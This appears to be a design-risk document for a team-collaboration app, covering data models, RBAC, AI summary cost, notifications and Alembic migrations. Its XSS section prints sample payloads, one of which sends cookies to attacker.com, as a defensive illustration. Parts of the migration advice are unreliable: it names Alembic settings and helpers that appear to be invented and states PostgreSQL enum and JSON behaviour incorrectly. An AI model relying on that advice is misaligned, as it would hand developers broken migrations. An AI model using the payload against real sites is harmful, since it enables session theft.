# Domain Pitfalls: TeamFlow Milestone v2.2

**Domain:** Adding standup/updates, Knowledge Sharing Scheduler, and AI-summarized Weekly Board to an existing FastAPI + SvelteKit 5 + PostgreSQL 16 team tool
**Researched:** 2026-04-28
**Applies to:** Subsequent milestone on a working app (v2.1 refactor complete, stable migration chain)

---

## 1. Calendar Integration — `Schedule` Model Is User-Scoped, KS Sessions Are Team-Scoped

### Risk

The existing `Schedule` model (`backend/app/models/work.py`) has `user_id = Column(Integer, ForeignKey("users.id"), nullable=False)`. Every schedule query in `routers/schedules.py` filters by `Schedule.user_id == current_user.id`. This is a personal calendar.

Knowledge Sharing sessions are team-wide events: any team member must be able to see them (read-only), only supervisors/admins can create/edit them. If the KS sessions are stored in the existing `Schedule` table with a flag field, the `GET /api/schedules/` endpoint will silently exclude them from members' views because of the `user_id` filter — sessions created by the supervisor will be invisible to the team.

Two bad paths people take here:

1. **Reuse `Schedule` with a `user_id = supervisor_id`** — members cannot see them; the filter gates them out.
2. **Remove the `user_id` filter from `GET /api/schedules/`** — personal events from all users leak to everyone.

The right path is a separate `KnowledgeSession` model (or a `team_id`-scoped event table), served via a separate router with its own visibility rules: supervisor creates, all team members can read.

### Prevention

- Create a dedicated `knowledge_sessions` table. Do not add a `type` discriminator to `schedules`; the ownership semantics are incompatible.
- The `GET /api/knowledge-sessions/` endpoint applies no `user_id` filter — it returns all sessions visible to the authenticated user's team.
- The calendar frontend (`schedule/+page.svelte`) currently merges two event sources: `schedules` (personal) and `tasks` (due-dates). Add KS sessions as a third source in the same `EventItem` union type with `source: 'knowledge-session'` to render them differently (read-only, no edit controls for members).
- Apply the RBAC check at creation: `require_supervisor` or `is_admin` for POST/PATCH/DELETE; any authenticated user for GET.

### Phase

Address in the phase that introduces the Knowledge Sharing Scheduler. Do not attempt to piggyback on the existing `Schedule` model.

---

## 2. Calendar Integration — Notification System Uses a PostgreSQL Enum for `event_type`

### Risk

`NotificationEventType` in `backend/app/models/enums.py` is a Python `str(enum.Enum)` that maps to a PostgreSQL native ENUM type. Adding a new notification event type (e.g., `knowledge_session`) requires an Alembic migration that runs `ALTER TYPE notificationeventtype ADD VALUE 'knowledge_session'`.

PostgreSQL has a specific constraint: `ALTER TYPE ... ADD VALUE` cannot run inside a transaction. Alembic by default wraps each migration in a transaction. If this migration is written as a normal `op.execute(...)` call inside the default transactional context, it will fail in PostgreSQL with:

> `ERROR: ALTER TYPE ... ADD VALUE cannot run inside a transaction block`

This fails silently during development if you are using SQLite (which does not enforce this constraint) but breaks on the real PostgreSQL instance.

The existing migration `a1b2c3d4e5f6_add_role_enum.py` in the chain is the reference pattern — it must be checked to confirm whether it used `render_as_batch` or `op.execute` directly.

### Prevention

- In the Alembic migration that adds the new `NotificationEventType` value, set `transaction_per_migration = False` or execute it using `op.execute("ALTER TYPE notificationeventtype ADD VALUE 'knowledge_session'")` inside an `execute_if` context that disables transaction wrapping. The standard pattern is to add a `alembic_version_table` entry manually or use `schema_migrations_without_tx`.
- Simpler alternative: avoid extending the PostgreSQL enum at all. Store the new event type as a VARCHAR column with a CHECK constraint. Only do this for newly added tables, not for the existing `event_notifications.event_type` column (which cannot be changed without a migration).
- Test the migration against the PostgreSQL container (not SQLite) in the phase's verification step — the CI pipeline must run against Postgres.
- The notification router's `_resolve_event` function has a hardcoded `if event_type == NotificationEventType.schedule` / `if event_type == NotificationEventType.task` dispatch. Adding `knowledge_session` requires adding a branch here, or the notification bell will fail to resolve KS session reminders.

### Phase

Address in the same phase as Knowledge Sharing Scheduler. The enum extension and the `_resolve_event` dispatch update must be in the same PR.

---

## 3. Standup Post Task Snapshot — Snapshot vs Live Query

### Risk

The standup post must include "a snapshot of the member's current task statuses." There are two interpretations:

1. **Live query at render time** — fetch the member's current tasks each time the standup post is displayed.
2. **Frozen snapshot at post time** — serialize task statuses into the standup record at the moment of submission.

Path 1 is tempting because it requires no extra storage and always shows up-to-date task state. But it is semantically wrong: a standup post records what was true *when the member submitted it*, not what is true today. If task A was `in_progress` when the standup was posted Monday but moved to `done` by Tuesday, the Monday standup should still show `in_progress`.

Path 2 (frozen snapshot as JSON) requires `JSONB` or `TEXT` storage and a deliberate schema choice. The risk is skipping this and using path 1, then discovering six weeks later that historical standups are meaningless because they reflect current state, not the state at the time of posting.

### Prevention

- Store the task snapshot as a `JSONB` column on the standup model: `task_snapshot = Column(JSONB, nullable=True)`. At post time, serialize `[{task_id, title, status, priority}]` for the member's assigned tasks.
- The API endpoint that creates a standup post fetches `SELECT tasks WHERE assignee_id = current_user.id` and serializes the result into `task_snapshot` before inserting the row. The client does not send this data — it is server-generated.
- The `GET /api/standups/{id}` response returns `task_snapshot` as-is; the frontend renders it as a read-only status list.
- Do not use a separate `standup_task_items` join table unless you need to query across snapshots by task. For this feature's scope, JSONB is simpler and sufficient.

### Phase

Address in the phase introducing standup posts. The snapshot strategy must be decided before writing the migration — changing it later requires a data migration.

---

## 4. AI Weekly Summary — Unbounded Input Size and Cost

### Risk

The Weekly Board AI summary will call `acompletion(...)` (the existing LiteLLM wrapper in `backend/app/utils/ai_client.py`) with the text of all board posts from the current week. For a team of 15 people each writing 200–500 word posts over five days, that is 15,000–37,500 tokens of input — plus the summary prompt overhead. At GPT-4o pricing, a single weekly summary call could cost $0.15–$0.60. With on-demand triggering (any supervisor can call it repeatedly), costs can spiral.

The existing AI router has no token budget enforcement, no caching, and no deduplication. The project summary endpoint (`POST /api/ai/projects/{project_id}/summary`) does not save its output — it regenerates on every call. Replicating that pattern for the Weekly Board means the same posts are summarized repeatedly with full token costs each time.

Additionally, if no posts exist for the week, sending an empty input to the AI produces hallucinated summaries. The AI will invent fictional updates.

### Prevention

- Store the generated summary as a column on a `WeeklyBoard` model: `ai_summary = Column(Text, nullable=True)`, `ai_summary_generated_at = Column(DateTime, nullable=True)`.
- On-demand generation: if `ai_summary_generated_at` is within the last N minutes (configurable, default 30), return the cached value instead of re-invoking the AI. This prevents rapid repeat clicks from triggering duplicate calls.
- Enforce a token budget at the application level: truncate or summarize individual posts before sending them to the AI if total character count exceeds a threshold (e.g., 50,000 characters). Truncate oldest posts first, not the most recent.
- Guard against empty input: if no posts exist, return a structured "no updates this week" response without calling the AI at all.
- Apply a rate limit on the on-demand summary endpoint: `@limiter.limit("5/hour")` per user, consistent with the existing `@limiter.limit("30/minute")` pattern in `ai.py`.
- For the auto-generated end-of-week summary, add a new APScheduler cron job (e.g., Sunday 23:59 UTC) alongside the existing `process_due_notifications` job in `internal/scheduler_jobs.py`. This job must check that the summary has not already been generated for the week before invoking the AI.

### Phase

Address in the Weekly Board phase. The caching strategy must be decided before implementation — retrofitting it onto a live endpoint with stored summaries is a schema change.

---

## 5. AI Weekly Summary — Quality: Generic Output and Prompt Design

### Risk

Weekly summaries generated from a generic "summarize these posts" prompt will produce outputs like "The team had a productive week. Several tasks were completed. There were some blockers." This is useless. The value proposition of the AI summary is to give the supervisor an at-a-glance digest that surfaces blockers, completions, and themes across all team member updates.

Common quality failures:

- The AI lists updates sequentially rather than synthesizing across members.
- Blockers are buried in prose instead of surfaced as a distinct list.
- The AI makes up details not present in the posts (hallucination, especially when posts are vague).
- The summary does not attribute updates to specific team members, so the supervisor cannot follow up.

The existing AI system prompt (`SYSTEM_PROMPT` in `routers/ai.py`) is generic: "You are a helpful project management assistant." Reusing it for summaries will produce low-quality output.

### Prevention

- Write a dedicated summary prompt that specifies the desired output structure. Example structure: (1) Key completions this week (with member names), (2) Active blockers (with member names and what is blocking them), (3) Recurring themes or patterns across updates. The prompt should explicitly say: "Do not invent information not present in the posts. If a category has no content, say 'None reported'."
- Pass structured input to the AI: format each post as `[MEMBER: {name}]\n{post_body}\n` rather than raw concatenated text. This helps the AI attribute points to members.
- Specify the desired output format (markdown with headers) in the prompt, since the summary will be rendered as markdown on the Weekly Board.
- Test the prompt against a real week of test posts before finalizing the phase. Quality cannot be verified from unit tests — manual review of the output is required.

### Phase

Address in the Weekly Board phase, specifically the AI prompt design step. Allow time for prompt iteration — at least one round of human review of generated output.

---

## 6. Markdown Rendering — XSS via User-Generated Content

### Risk

The frontend `package.json` contains no markdown rendering library (`marked`, `micromark`, `remark`) and no HTML sanitizer (`DOMPurify`, `sanitize-html`). The Weekly Board posts and standup posts will contain user-written markdown content.

If the frontend renders markdown by passing raw content to `{@html someMarkdown}` in Svelte (the tempting shortcut), and the markdown is not sanitized, any team member can inject arbitrary HTML/JavaScript:

```markdown
[click me](javascript:alert(document.cookie))
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="...">
```

Svelte's template engine does NOT sanitize `{@html}` — it is documented as unsafe for untrusted input. This is a stored XSS vulnerability: malicious content is saved to the database and executed for every user who views the board.

The app uses JWT cookies for auth. If cookies are not `HttpOnly`, stored XSS enables session theft across the entire team.

### Prevention

- Install a markdown renderer with built-in sanitization: **`marked` + `DOMPurify`** is the standard pair, or use **`marked` with the `sanitize` option** (deprecated in newer versions — prefer explicit DOMPurify). An alternative is `micromark` which does not produce HTML directly.
- The safe rendering pattern in SvelteKit 5:
  ```typescript
  import { marked } from 'marked';
  import DOMPurify from 'dompurify';
  const safeHtml = DOMPurify.sanitize(marked.parse(rawMarkdown));
  // then: {@html safeHtml}
  ```
- Do not use `{@html marked.parse(rawMarkdown)}` without sanitization under any circumstances.
- Validate and sanitize markdown content on the backend as well (defense in depth): strip `<script>` tags, `javascript:` protocol links, and inline event handlers before storing to the database.
- Add DOMPurify to `frontend/package.json` as a production dependency in the same PR that introduces markdown rendering. Do not defer this — the risk is present from the first rendered post.
- Check that auth cookies are set with `HttpOnly=true` in the backend (the existing FastAPI auth flow should be audited in this phase).

### Phase

Address in the first phase that renders markdown (standup posts or Weekly Board, whichever comes first). Never introduce `{@html}` rendering without DOMPurify in the same commit.

---

## 7. Notification Fatigue — New Events Must Opt-In, Not Opt-Out by Default

### Risk

The existing notification system triggers on: schedule reminders, task due dates, sprint end, milestone due, and reminder settings proposals. Adding three new feature areas (standup posts, knowledge sessions, weekly board) will introduce new notification event types. If all new notifications are enabled by default for all users, the notification bell becomes noise and users start ignoring it or hiding it entirely.

Specific failure modes:
- Every standup post by a team member triggers a notification for every other member (N×M notifications per day for a 15-person team).
- Every new KS session created triggers a notification to all 15 team members.
- The weekly AI summary triggers a notification to all members even if they do not need to act on it.

The existing `EventNotification` model has no `muted` or `preference` mechanism. The `SubTeamReminderSettings` model controls sprint/milestone reminder toggles — but it is team-level, not user-level, and covers only sprint/milestone events.

### Prevention

- Do not create `EventNotification` rows for standup posts at all — standup posts are pull (the supervisor checks them) not push. A single digest notification ("3 new standup updates today") is sufficient, not one per post.
- For KS sessions: create a notification only for the session's presenter/assignee (they need to prepare), plus a single reminder to all team members 24 hours before the session (using the existing `remind_at` pattern).
- For the weekly board summary: no notification unless the summary is new. Send one notification to the supervisor when the auto-generated summary is ready. Do not notify team members.
- When adding new `NotificationEventType` values, evaluate each one against: "does this require immediate action from the recipient?" If no, do not use a notification.
- If notification preferences per user are needed later, that is a separate feature — do not pre-build it in this milestone.

### Phase

Address in each phase as new notification-triggering events are introduced. The standup phase must explicitly decide "no per-post notifications." The KS scheduler phase must define the exact notification targets. The Weekly Board phase must confirm "summary-ready notification to supervisor only."

---

## 8. Schema Migration — Alembic Chain and PostgreSQL ENUM Extension

### Risk

The current migration chain head is `d3e4f5a6b7c8` (add_status_transitions). There is one prior merge migration (`f836fa8d42c6`). v2.2 adds at least three new tables (standup posts, knowledge sessions, weekly board posts) plus potential enum extensions. Risks:

1. **Creating a second branch and forgetting to merge.** If standup migrations and KS session migrations are developed in parallel branches and both use `down_revision = "d3e4f5a6b7c8"`, Alembic will detect a branch and `alembic upgrade head` will fail or silently only run one branch.

2. **JSONB column in non-PostgreSQL-compatible migration.** The task snapshot stored as `JSONB` uses `sa.JSON()` in SQLAlchemy, which maps to `JSONB` in PostgreSQL and `JSON` in SQLite. The test suite (`test_e2e.db` in the backend root suggests SQLite is used for tests). SQLite does not support `JSONB`; using `sa.JSON()` works but loses PostgreSQL-specific JSONB operators in queries.

3. **Adding columns to high-traffic tables.** Adding nullable columns to `tasks` (e.g., if the standup model references tasks via FK) is safe in PostgreSQL. Adding `NOT NULL` columns without a default will fail on tables with existing rows.

4. **Migration rollback is not tested.** The existing migrations do not have verified `downgrade()` implementations. If a v2.2 migration is applied to production and needs to be rolled back, an empty `downgrade()` (like `f836fa8d42c6`) will silently do nothing.

### Prevention

- Write all three v2.2 tables (standup posts, knowledge sessions, weekly board) as a single linear migration chain, or as three separate migrations with explicit `down_revision` chaining verified before creation.
- If the standup and KS migrations are developed in separate feature branches, create a merge migration immediately on integration — do not leave the chain branched.
- For JSONB columns: use `from sqlalchemy.dialects.postgresql import JSONB` and type the column as `Column(JSONB, nullable=True)` in the model. Accept that tests running on SQLite will use a TEXT fallback. Alternatively, run integration tests against a PostgreSQL container (already used in Docker Compose) rather than SQLite.
- All new columns on new tables are nullable or have server defaults — no `NOT NULL` without a default on a fresh table since new tables start empty.
- Write and manually test the `downgrade()` for each new migration during development, not after.
- The migration for `NotificationEventType` enum extension must use `op.execute` outside a transaction block (see Pitfall 2 above).

### Phase

The migration chain is cross-cutting. Establish the chain before any v2.2 feature phase merges. Verify `alembic history --verbose` shows a single linear chain (no branches) before each phase is marked complete.

---

## 9. Knowledge Session Calendar Tab — Frontend State Leak Between Calendar Modes

### Risk

The existing calendar (`frontend/src/routes/schedule/+page.svelte`) uses a component-local state pattern: `let scheduleList: any[]`, `let taskEvents: EventItem[]`, loaded via `onMount(loadAll)`. The calendar renders a single month view with all event sources merged.

Adding a "Knowledge Sessions" tab inside the same calendar component introduces a new UI mode: users toggle between "My Calendar" and "Knowledge Sessions." Common mistakes:

1. **Shared `showModal` / `editingSchedule` state leaks across tabs.** If the user opens an edit modal for a personal schedule event, then switches to the KS tab, the form state (`form`, `formReminders`) is not cleared, causing the KS create/view modal to display stale values.

2. **`loadAll()` is called once on mount.** Adding KS sessions as a third data source requires either re-fetching on tab switch or fetching all sources in the initial `loadAll`. If KS sessions are fetched on mount but the tab is not initially visible, a network error in the KS fetch will silently break the initial load.

3. **The calendar renders events by `start_time` for the current month.** KS sessions created in other months will not appear even if the user is trying to create one in a future month — the date filter `start >= startOfMonth` must be applied consistently for all event types.

### Prevention

- Keep KS session state (`knowledgeSessions`, `showKSModal`, `editingKS`) as separate variables from the personal schedule state. Do not reuse `editingSchedule` or `form` for both.
- On tab switch, explicitly clear modal state: reset `showModal = false`, `showKSModal = false`, `editingSchedule = null`, `editingKS = null`.
- Fetch KS sessions in the same `loadAll()` call to avoid partial-load failures, but make the fetch non-fatal: if the KS endpoint fails, personal calendar still works.
- Apply the same `start` / `end` date range filter to the KS session API call as to personal schedules.
- For members (non-supervisors): render KS sessions as read-only items — no create/edit controls. Apply this at the component level via a role check against the user store, not by hiding buttons with CSS.

### Phase

Address in the Knowledge Sharing Scheduler phase. The tab structure must be designed before implementing the API — retrofitting tab isolation into a shared-state component is error-prone.

---

## 10. Standup Post Visibility — RBAC Inconsistency

### Risk

The requirement states standup posts are "visible to all team members and the supervisor." In the existing RBAC model (`UserRole.admin`, `UserRole.supervisor`, `UserRole.member`), "visible to all" means any authenticated user in the team. However, the existing `tasks.py` pattern gates most writes on ownership (`assignee_id == current_user.id` or `creator_id == current_user.id`) and most reads are open.

Two inconsistency risks:

1. **Member A can edit Member B's standup post.** If the standup router only checks `is_authenticated` (no ownership check on PATCH/DELETE), any member can overwrite another's standup.

2. **Supervisor cannot see all standups if the query filters by `author_id = current_user.id`.** If the list endpoint follows the schedule pattern (`WHERE user_id = current_user.id`), supervisors get only their own standups, defeating the supervisory value.

### Prevention

- Standup post ownership rules:
  - `POST /api/standups/` — any authenticated member creates for themselves (server sets `author_id = current_user.id`, client cannot override this field).
  - `GET /api/standups/` — members see all team standups (no `author_id` filter); supervisors/admins also see all.
  - `PATCH /api/standups/{id}`, `DELETE /api/standups/{id}` — only the post author can edit/delete. Add: `if standup.author_id != current_user.id: raise HTTPException(403)`.
- Do not copy the schedule router pattern which filters all reads by `user_id`. Write the standup router from scratch with these explicit rules.
- Add a test: authenticate as Member B, attempt PATCH on Member A's standup, assert 403.

### Phase

Address in the standup posts phase. Write the visibility rules as a test fixture before implementing the endpoint — clarifies the rules before code is written.

---

## Summary: Phase Assignment Matrix

| Pitfall | Phase | Severity |
|---------|-------|----------|
| KS sessions on separate model (not Schedule) | Knowledge Sharing Scheduler phase | Critical |
| XSS via `{@html}` without DOMPurify | First markdown-rendering phase (standup or board) | Critical |
| NotificationEventType enum extension in transaction | KS Scheduler phase | Critical |
| Task snapshot frozen at post time (JSONB, not live) | Standup posts phase | High |
| AI summary token budget + caching | Weekly Board phase | High |
| Standup RBAC: author-only edit, all-team read | Standup posts phase | High |
| Migration chain branching across parallel features | All v2.2 phases — verify before each merge | High |
| Notification fatigue — opt-in, not opt-out | Each phase as events are introduced | High |
| Calendar tab state leak (shared modal state) | KS Scheduler phase (calendar integration) | Medium |
| AI summary quality — prompt structure | Weekly Board phase | Medium |
| JSONB vs SQLite test compatibility | Standup posts phase (migration) | Medium |
